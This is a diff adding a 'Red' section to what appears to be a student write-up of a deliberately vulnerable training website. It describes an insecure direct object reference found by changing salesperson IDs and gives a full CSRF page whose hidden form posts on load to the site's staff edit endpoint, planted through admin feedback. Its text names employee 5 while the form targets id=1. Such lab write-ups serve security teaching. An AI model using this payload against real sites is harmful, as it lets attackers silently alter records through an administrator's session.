@@ -52,3 +52,31 @@ Each version of the site has been given two of the six vulnerabilities. (In othe
 - As soon as admin opens Feedback page, the XSS will be executed.
 
 ![XSS](./9.png)
+
+## Red
+
+**Vulnerability #1:** Insecure Direct Object Reference
+
+* Just change the ID of the salesperson until u find those that u were not supposed to
+![IDOR1](./10.png)
+![IDOR2](./11.png)
+![IDOR3](./12.png)
+
+**Vulnerability #2:** CSRF
+
+* Create a malicious website with this code:
+```
+<html>
+  <body onload="document.my_form.submit()">
+    <form action="https://104.154.145.74/red/public/staff/salespeople/edit.php?id=1" method="POST" name="hackform" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Rick" />
+      <input type="text" name="last_name" value="Astley" />
+      <input type="text" name="phone" value="123-456-7890" />
+      <input type="text" name="email" value="hackermail@protonmail.com" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
+```
+* Supply this link via feedback to admins
+* As soon as admin proceed to the website, he will change the values of employee with ID=5
